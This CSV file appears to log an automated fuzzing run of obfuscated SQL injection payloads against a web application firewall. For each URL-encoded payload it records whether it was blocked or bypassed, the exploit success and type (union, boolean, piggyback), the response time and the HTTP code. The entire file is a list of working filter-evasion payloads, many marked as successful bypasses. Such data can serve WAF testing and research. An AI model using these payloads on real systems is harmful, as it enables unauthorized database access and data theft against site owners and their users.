Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.%0b||+not%0b{x%0b(select+1)}=1=+(!+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0256,71.28,No,200
0'<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0093,71.28,No,500
0%27<@=1+or+not%7e0=+(!%0b{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0169,71.28,No,200
0%27<@!=.1+or+not+{a+1}=1=+(!%0b{x+(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0249,71.28,No,200
0'<@!=1.+||%0b{a+1}=1+like+{x%0b(select+1)}=1+||%27,Bypassed,No,None,Unknown,0.0197,71.28,No,500
0%27<@=.1+||%0b!%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0145,71.39,No,403
0%27<@=1.%0b||%0b!%0b{x+(select+1)}=1=+(not%0b1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0155,71.51,No,200
0'<@=1.%0b||+not%0b{`if`+1}=1=+(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0208,71.51,No,500
0%27<@!=1.%0bor%0b!+{`if`%0b1}=1=%0b(not%7efalse)%0bor',Bypassed,No,None,booleanAtk,0.0196,71.51,No,500
0%27or+!@<@.+||%0bnot%0b{x+(select%0b1)}=1=%0b(not+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.012,71.51,No,200
0'<@!=1%0bor+not+{`if`+1}=1=%0b(!%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.0175,71.51,No,500
0'<@!=.1%0b||%0b!%0b{x+(select%0b1)}=1=+(!~false)+or%27,Bypassed,No,None,booleanAtk,0.0213,71.51,No,500
0%27<@!=.1+or+!%0b{a+1}=1=%0b(not%0b{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0189,71.51,No,200
0%27<@!=.1+or%0b!+{a+1}=1=%0b(not+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0084,71.51,No,200
0%27<@!=1.%0bor%0b!%0b{x%0b(select+1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0238,71.51,No,200
0'<@!=1+or+not%0b{a%0b1}=1=+(!%7e0)%0b||',Bypassed,No,None,Unknown,0.4959,71.51,No,500
0'or%0b@<@.+or+not%0b{a%0b1}=1=+(not~false)+or%27,Bypassed,No,None,booleanAtk,0.0172,71.51,No,500
0'<@=1.%0b||%0bnot%0b{x+(select+1)}=1=%0b(not%0btrue)+||%27,Bypassed,No,None,Unknown,0.0175,71.51,No,500
0%27<@!=.1+or+not+true=+(not+{a%0b1}=1)+or',Bypassed,No,None,booleanAtk,0.0211,71.51,No,500
0'<@=.1%0b||+not%0b{x+(select%0b1)}=1=+(!~false)%23,Bypassed,No,None,piggyAtk,0.0151,71.51,No,500
0%27<@!=1%0bor%0b!+{x+(select%0b1)}=1=+(not+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0186,71.51,No,200
0'<@!=1+or+not+{x+(select%0b1)}=1=+(not%7e0)%23,Blocked,No,None,piggyAtk,0.0129,71.51,No,403
0%27<@!=1+or%0b!%0b1=%0b(!+{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0144,71.51,No,500
0'<@!=1.+or+not%0b{a%0b1}=1=%0b(!%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0279,71.51,No,500
0'<@!=1.+||+not+{x%0b(select%0b1)}=1=+(not+1)--%0b,Bypassed,No,None,piggyAtk,0.0132,71.51,No,500
0'<@!=.1+||+not+1=+(!~false)%0bor%27,Blocked,No,None,booleanAtk,0.0126,71.51,No,403
0%27<@=1.+or+not+{`if`+1}=1=%0b(!%0b{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0148,71.51,No,200
0%27<@!=1%0b||%0bnot%0b{`if`%0b1}=1=+(not~false)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0114,71.51,No,200
0%27<@=.1+||%0bnot~false=+(not+{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0193,71.51,No,200
0'<@!=1%0bor+0=+(not%7e0)+||',Bypassed,No,None,Unknown,0.0104,71.51,No,500
0%27<@!=1%0b||%0b!+{`if`+1}=1=%0b(!+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0229,71.51,No,200
0%27<@!=1.+or+not+{x%0b(select%0b1)}=1=+(not%0b1)+or',Bypassed,No,None,Unknown,0.0149,71.51,No,500
0%27<@!=1+||+!+{a%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0238,71.51,No,200
0'<@=1.+||+!%0b{x%0b(select%0b1)}=1=+(not~false)+||%27,Bypassed,No,None,Unknown,0.0128,71.51,No,500
0%27<@!=1%0b||%0bnot+{a+1}=1=+(!+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0078,71.51,No,200
0'<@!=.1+or%0bnot+{x%0b(select+1)}=1=+(not+true)+or',Bypassed,No,None,booleanAtk,0.0139,71.51,No,500
0'||+@<@.+or%0bnot%0b{`if`+1}=1=%0b(!+{`if`+1}=1)+,Bypassed,No,None,Unknown,0.0201,71.51,No,500
0'<@=.1%0bor+!%0b{a%0b1}=1=%0b(not+{`if`%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0238,71.51,No,500
0'<@!=1%0bor%0b!+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0135,71.51,No,500
0'<@=1+or+!+{x%0b(select%0b1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.015,71.75,No,500
0%27<@=1+or+not+{x+(select+1)}=1=+(not~false)+||',Blocked,No,None,booleanAtk,0.0121,71.75,No,403
0'<@!=.1%0b||+!%0b{x+(select%0b1)}=1=+(!+{`if`+1}=1)+,Bypassed,No,None,Unknown,0.01,71.75,No,500
0'<@!=1+||+not+{`if`%0b1}=1=%0b(!%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0216,71.75,No,500
0%27<@=.1%0b||+not%0b{x%0b(select%0b1)}=1=+(not~false)%0b||',Bypassed,No,None,Unknown,0.0248,71.75,No,500
0'<@=1.+or%0bnot%7e0=+(not~false)+or%27,Blocked,No,None,booleanAtk,0.0111,71.75,No,403
0'<@!=1.%0b||+{`if`%0b1}=1%0blike+true+||%27,Bypassed,No,None,Unknown,0.0128,71.75,No,500
0'<@!=1.+or%0bnot+{x+(select+1)}=1=+(not+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0112,71.85,No,403
0'<@=1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(!+true)%0bor',Bypassed,No,None,booleanAtk,0.0142,71.95,No,500
0%27<@=1.%0bor+not+true=+(!~0)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0176,71.95,No,200
0'<@!=1.+||%0b!%7efalse=+(!+{`if`%0b1}=1)%0b||',Blocked,No,None,Unknown,0.0179,71.28,No,403
0'<@=1%0bor+not+{a%0b1}=1=+(!%0b{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0157,71.28,No,500
0'<@!=1%0b||%0b!%0b{x+(select%0b1)}=1=+(!+{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0163,71.28,No,500
0%27<@!=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0207,71.28,No,200
0%27<@!=1.+||+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.017,71.28,No,403
0'<@!=.1%0b||+{`if`+1}=1+like+{x+(select+1)}=1--%0b,Bypassed,No,None,piggyAtk,0.0252,71.39,No,500
0%27<@!=1+or%0b!+{a%0b1}=1=%0b(not+{a%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0168,71.51,No,200
0%27<@!=1.%0bor+not+1=+(not%0b{`if`%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0103,71.51,No,200
0'<@=1%0bor%0bnot+1=%0b(not%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0187,71.51,No,500
0'<@!=.1+||%0bnot+{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0256,71.51,No,500
0'<@!=1.%0bor%0b{a%0b1}=1+like+{x+(select+1)}=1+or%27,Bypassed,No,None,Unknown,0.0178,71.51,No,500
0%27<@=1+or+not+{a+1}=1=+(not+1)%0bor',Blocked,No,None,Unknown,0.0049,71.51,No,403
0%27<@=1.%0b||+not%0b{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0156,71.51,No,200
0'<@!=1+||%0bnot+{`if`+1}=1=%0b(not%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0122,71.51,No,500
0'or%0b1<@+or+{x+(select+1)}=1%0blike+{`if`+1}=1+or%27,Blocked,No,None,Unknown,0.0116,71.51,No,403
0'<@=.1%0b||+not%0b{`if`+1}=1=+(not+{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0118,71.51,No,500
0%27<@=.1%0b||+not+{x%0b(select+1)}=1=%0b(not+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,71.51,No,200
0'<@!=.1+or%0bnot+{a%0b1}=1=+(not%0b{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0247,71.51,No,500
0%27<@!=1%0bor+not~false=+(!%0b{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0247,71.51,No,200
0'<@!=1.%0bor%0bnot+{`if`%0b1}=1=+(not%0b{x+(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0141,71.51,No,500
0%27<@!=1.+or+!%7efalse=%0b(!%0b{`if`+1}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0181,71.51,No,200
0%27<@=1.%0b||%0b!+{x+(select+1)}=1=%0b(!+true)%0bor',Bypassed,No,None,booleanAtk,0.0173,71.51,No,500
0'<@=1+or%0b!+{x+(select%0b1)}=1=%0b(not%7efalse)+||',Blocked,No,None,booleanAtk,0.0107,71.51,No,403
0%27<@!=1.+or+not+1=+(!+{a+1}=1)%0bor',Blocked,No,None,Unknown,0.0228,71.51,No,403
0%27<@!=1.+or%0b!%0b{a%0b1}=1=%0b(not+{x+(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0244,71.51,No,200
0%27<@!=.1+||%0b!+{x+(select+1)}=1=%0b(not%7e0)+or',Blocked,No,None,Unknown,0.0157,71.51,No,403
0%27<@!=1+||%0b{x%0b(select%0b1)}=1+like%0b{x%0b(select+1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0133,71.51,No,200
0'<@!=1+or+!%0b{x%0b(select+1)}=1=%0b(not+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.024,71.51,No,500
0%27<@=1+or+!%0b{x+(select+1)}=1%0bis%0bfalse+||',Bypassed,No,None,booleanAtk,0.0203,71.51,No,500
0'||+@<@.+or%0b!%0b{a+1}=1=+(!+{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0118,71.51,No,500
0%27<@!=1+or%0b!%7e0=+(!%7efalse)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0245,71.51,No,200
0%27<@!=1+or%0bnot+{x%0b(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0312,71.51,No,200
0%27or+@<@.+||+not%0b{a+1}=1=%0b(!+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.51,No,200
0%27<@!=1+or%0b!+{`if`%0b1}=1=%0b(!%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0275,71.51,No,500
0'or+@<@.+or%0b{`if`+1}=1+like+{`if`%0b1}=1+or',Bypassed,No,None,Unknown,0.017,71.75,No,500
0%27<@=1%0bor%0bnot+{x+(select+1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.012,71.75,No,200
0%27<@!=1+or%0b!%0b{`if`%0b1}=1=%0b(not%0b{a+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0211,71.75,No,200
0%27<@=1.+||+!+{`if`+1}=1=+(not+1)%0bor',Bypassed,No,None,Unknown,0.0084,71.75,No,500
0'<@=1.+||+!+{x%0b(select%0b1)}=1=+(!+true)%0b||%27,Bypassed,No,None,Unknown,0.0117,71.75,No,500
0%27<@=1.+||%0bnot+{a+1}=1=%0b(!+{x%0b(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0096,71.75,No,200
0%27<@!=1.%0b||+not+{x+(select%0b1)}=1=+(!+1)%0b||',Bypassed,No,None,Unknown,0.0101,71.95,No,500
0'<@=.1+or+!%0b{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)+,Bypassed,No,None,Unknown,0.0158,71.95,No,500
0'<@!=1.%0b||%0bnot%7e0=+(!+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0284,71.95,No,500
0%27<@!=1.+||%0b!%0b{a%0b1}=1=+(!%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0165,71.95,No,200
0%27<@=.1+||+not%0b1=%0b(not%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0441,72.12,No,200
0%27<@!=.1%0bor%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0285,72.3,No,200
0%27<@=1+||+!%0b{a%0b1}=1=+(not%0b{x+(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0302,72.3,No,200
0'<@!=1%0b||%0b!+{a%0b1}=1=+(!%0b{`if`%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0184,72.3,No,500
0%27<@!=.1%0b||+not%0b{x%0b(select+1)}=1=%0b(not+{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0212,72.3,No,200
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0195,72.3,No,200
0'<@=1.+||%0b!%0b{a+1}=1=+(!+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0167,71.28,No,403
0%27<@!=1+||%0bnot+{`if`+1}=1=+(!%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0168,71.28,No,500
0%27<@!=1+||+{x+(select+1)}=1%0blike%0b{x+(select+1)}=1%0bor',Blocked,No,None,Unknown,0.0193,71.28,No,403
0%27<@!=1.%0bor%0bnot%0b{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0242,71.28,No,200
0'<@!=1%0bor+!%0b{x%0b(select+1)}=1=+(!%0btrue)--+,Bypassed,No,None,piggyAtk,0.014,71.28,No,500
0'<@!=1+or%0bnot~0=+(not%0b{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0199,71.28,No,500
0'<@!=1.+or+not+{x%0b(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0168,71.51,No,500
0'<@!=.1+or%0bnot%0b{x%0b(select%0b1)}=1=+(!%7e0)+||',Blocked,No,None,Unknown,0.0059,71.51,No,403
0%27<@=1+||+!+{x+(select%0b1)}=1=+(not%0b1)+or%27,Blocked,No,None,Unknown,0.0156,71.51,No,403
0%27<@!=.1%0b||%0b!%7efalse=%0b(!+true)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0204,71.51,No,200
0'<@!=.1%0bor%0bnot+{x+(select%0b1)}=1=+(not%0b{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0234,71.51,No,500
0'<@!=.1+||+0=%0b(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0153,71.51,No,500
0%27<@!=.1+or%0b!%0b1=+(!+{x%0b(select+1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0167,71.51,No,200
0'<@=1.+or+!%0b{`if`+1}=1=%0b(!+1)%0bor',Bypassed,No,None,Unknown,0.0119,71.51,No,500
0'<@=.1+||%0b!%0b{x%0b(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0251,71.51,No,403
0%27<@=.1%0b||%0b!+{a%0b1}=1=+(not%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0212,71.51,No,500
0%27<@=1%0b||+0=%0b(!+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.012,71.51,No,500
0%27<@!=.1%0b||%0bnot%0b{a+1}=1=%0b(not+{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.5002,71.51,No,200
0%27<@!=1+or%0b!+{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0218,71.51,No,200
0'<@=1.%0b||+not%0b{x%0b(select%0b1)}=1=+(not~false)--+,Bypassed,No,None,piggyAtk,0.0195,71.51,No,500
0%27<@=.1+or+!%0b{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0114,71.51,No,200
0'<@!=1.%0bor+!+{x+(select+1)}=1=+(not+{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0309,71.51,No,500
0%27<@!=.1+or+not%0b{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0257,71.51,No,200
0'<@=1.+or+!+{x+(select%0b1)}=1=%0b(0)%0b||',Blocked,No,None,Unknown,0.0133,71.51,No,403
0%27<@!=.1+or%0b0=+(!%0b{`if`+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0237,71.51,No,200
0%27<@!=.1+or+!+{x%0b(select%0b1)}=1=+(!%0b1)+||',Bypassed,No,None,Unknown,0.0205,71.51,No,500
0%27<@!=1.%0bor+!%0b{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0199,71.51,No,200
0%27<@=1.+||%0bnot+true=+(not+{x+(select%0b1)}=1)+or',Blocked,No,None,booleanAtk,0.0202,71.51,No,403
0'<@=.1+||%0b!%0b{x+(select+1)}=1=+(!%0b{a+1}=1)+,Blocked,No,None,Unknown,0.0174,71.51,No,403
0%27<@=.1+or+!%0b{a+1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0347,71.51,No,200
0%27<@=1+or%0b!%0b{x%0b(select%0b1)}=1=+(not+true)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0171,71.51,No,200
0'<@=.1%0bor%0b!%0b{x%0b(select+1)}=1=+(!%7efalse)%0bor',Bypassed,No,None,booleanAtk,0.0164,71.51,No,500
0%27<@!=1.+||%0b{x%0b(select%0b1)}=1%0blike%0b{x%0b(select%0b1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0163,71.51,No,200
0'<@!=.1+||%0b!+{x+(select%0b1)}=1=+(!%0b{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0155,71.63,No,403
0%27<@!=.1%0b||+!%7efalse=%0b(false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0135,71.75,No,200
0%27<@!=1%0bor+!%0b{x%0b(select%0b1)}=1=%0b(not%7efalse)--+,Bypassed,Yes,unionAtk,piggyAtk,0.015,71.75,No,200
0'<@=.1%0bor+!+{x%0b(select%0b1)}=1=%0b(false)%0b||%27,Bypassed,No,None,booleanAtk,0.0126,71.75,No,500
0'<@!=1+or+not%0b1=%0b(not~false)+or',Blocked,No,None,booleanAtk,0.0136,71.75,No,403
0%27<@=1+||%0b!+1=+(!%7efalse)%0b||',Bypassed,No,None,Unknown,0.0196,71.75,No,500
0%27<@=1.+||+!+{x+(select+1)}=1=+(!%0b{x+(select+1)}=1),Blocked,No,None,Unknown,0.0094,71.75,No,403
0%27<@!=.1+or+!%0b{x%0b(select%0b1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0279,71.85,No,200
0%27<@!=1+or+!%7efalse=%0b(not+{`if`%0b1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0173,71.95,No,200
0%27<@!=1+or%0bnot+{a+1}=1=+(not+{x+(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0117,71.95,No,403
0%27or+@<@.+||+!%0b{x+(select+1)}=1=%0b(!~0)+,Bypassed,Yes,unionAtk,Unknown,0.0261,71.95,No,200
0'<@!=1.+||%0b!+{x%0b(select+1)}=1=+(!+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0105,71.95,No,500
0%27<@=.1+or+{`if`%0b1}=1+like+{a%0b1}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.008,72.12,No,200
0%27<@=1+||+!%7e0=%0b(!+{x%0b(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.018,72.3,No,200
0'<@=1.%0b||+!%0b{a+1}=1=+(!%0b{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0213,72.3,No,500
0'<@!=1.%0bor%0b!%0b{a%0b1}=1=%0b(not%0b{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0276,72.3,No,500
0%27<@=.1+or+not%0b{x%0b(select+1)}=1=+(not%0b{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0181,72.3,No,200
0'<@=.1+||%0b!%0b{a+1}=1=+(!+{x+(select%0b1)}=1)--,Blocked,No,None,piggyAtk,0.015,71.28,No,403
0%27<@=1.+or%0bnot%0b{a%0b1}=1=+(!+{x+(select%0b1)}=1)%0b,Blocked,No,None,Unknown,0.0185,71.28,No,403
0%27<@=1+or+not+{`if`+1}=1=%0b(!+{x%0b(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0128,71.28,No,200
0%27<@=1.+||+!%0b{`if`+1}=1=+(!+{x+(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.28,No,200
0%27<@=.1+||%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0232,71.39,No,200
0%27<@!=.1%0bor%0bnot+{x%0b(select+1)}=1=+(!+{a%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.022,71.51,No,200
0'<@=1.+||%0b0=+(not+{x+(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.0118,71.51,No,403
0%27<@!=1.+||%0b!%0b{a+1}=1=%0b(not%0b{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0178,71.51,No,200
0%27<@=1.%0b||+!%7efalse=+(not%0b{x+(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0251,71.51,No,200
0'<@!=1.+||%0bnot+{`if`%0b1}=1=%0b(not~false)+||%27,Bypassed,No,None,Unknown,0.028,71.51,No,500
0'<@!=1%0bor+not+{a+1}=1=+(!%0b{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0106,71.51,No,500
0'<@!=1%0bor%0b!+{a%0b1}=1=%0b(!+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0234,71.51,No,500
0%27<@=1+or+!%0b{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0158,71.51,No,200
0'||+!@<@.+or+not%0b{x+(select%0b1)}=1=%0b(!+{x+(select,Bypassed,No,None,Unknown,0.0216,71.51,No,500
0'<@=1+||%0b0=+(!~false)%0b||',Blocked,No,None,Unknown,0.0169,71.51,No,403
0'<@!=1+or+!~0+is+false%23,Bypassed,No,None,piggyAtk,0.0111,71.51,No,500
0'<@!=1.%0b||+not%0b{a%0b1}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.026,71.51,No,500
0'<@!=.1+or+not%0b{x%0b(select%0b1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0245,71.51,No,500
0'<@=1.+or+!%0b{a+1}=1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,No,None,Unknown,0.0184,71.51,No,500
0'||+@<@.+||%0bnot+{a+1}=1=%0b(not%0b{a+1}=1)+,Bypassed,No,None,Unknown,0.0126,71.51,No,500
0'<@=1+or+not%0b{`if`+1}=1=%0b(not+{x+(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0168,71.51,No,500
0%27<@!=1.+or+0=+(!+{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0145,71.51,No,200
0%27<@=1.%0b||+not+{x+(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0206,71.51,No,200
0%27<@=1+or%0bnot%0btrue=+(not+1)%0bor',Bypassed,No,None,booleanAtk,0.0187,71.51,No,500
0'<@=.1%0bor+not%0b{`if`+1}=1=+(not+true)--+,Bypassed,No,None,piggyAtk,0.0161,71.51,No,500
0%27<@!=1+||+not~0=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0228,71.51,No,200
0'<@!=.1%0bor+!+{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0176,71.51,No,500
0'<@=1+||+!%0b{x+(select%0b1)}=1=+(not~0)%0bor',Bypassed,No,None,Unknown,0.0199,71.51,No,500
0'<@=1%0b||%0bnot~false=+(false)+or%27,Bypassed,No,None,booleanAtk,0.0134,71.51,No,500
0'<@!=.1%0b||%0b!+{`if`+1}=1=+(!+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.02,71.51,No,500
0%27<@!=1+||%0b!+{x+(select%0b1)}=1=+(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0094,71.51,No,403
0'<@=1+or%0bnot~0=+(not%0b{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0192,71.51,No,500
0%27<@!=1.+or%0b!%0b{x%0b(select+1)}=1=%0b(false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0146,71.51,No,200
0'<@!=.1+or+0=+(not+true)+or%27,Blocked,No,None,booleanAtk,0.0118,71.51,No,403
0'<@!=1%0b||+!+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.018,71.63,No,500
0'<@=1%0bor%0b!%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0132,71.75,No,500
0%27<@!=1+or%0bnot+{a+1}=1=+(not~false)+or',Bypassed,No,None,booleanAtk,0.0193,71.75,No,500
0'<@!=.1+||%0b!%0b1=%0b(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0221,71.75,No,500
0%27<@!=1.%0b||%0b!%0b1=+(not+true)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0206,71.75,No,200
0'<@!=.1+||%0bnot+{`if`+1}=1=%0b(not%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0194,71.75,No,500
